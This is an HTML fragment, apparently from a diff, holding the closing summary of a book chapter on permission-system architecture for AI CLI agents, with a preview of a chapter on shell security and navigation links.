+<p>The permission system for an AI CLI agent is fundamentally different from traditional application permissions because the gap between user intent and agent action creates a space where neither "allow everything" nor "deny everything" works. The architecture described in this chapter --- six modes, eight prioritized sources, a deny-beats-ask-beats-allow evaluation algorithm, and an AI classifier for auto-mode --- provides a framework that is secure by default, minimally annoying in practice, and transparent when debugging.</p>
+<p>The key architectural insight is layering: deterministic rules handle the clear cases, heuristic scoring handles the moderate cases, and an LLM classifier handles the ambiguous cases. Each layer adds sophistication and cost, and the system short-circuits as early as possible. The permission system is not a security boundary (that is the sandbox's job) --- it is a trust negotiation system that aligns the agent's capabilities with the user's comfort level.</p>
+<p>In Chapter 19, we turn to the most dangerous tool in the agent's arsenal --- the shell --- and examine how to build a multi-layer security architecture that prevents command injection while preserving the full power of bash.</p>
+<div class="chapter-nav">
+  <a href="chapter-17.html">&larr; Previous</a>
+  <a href="index.html">Table of Contents</a>
+  <a href="chapter-19.html">Next &rarr;</a>
+</div>
+</div>
+</body>
+</html>
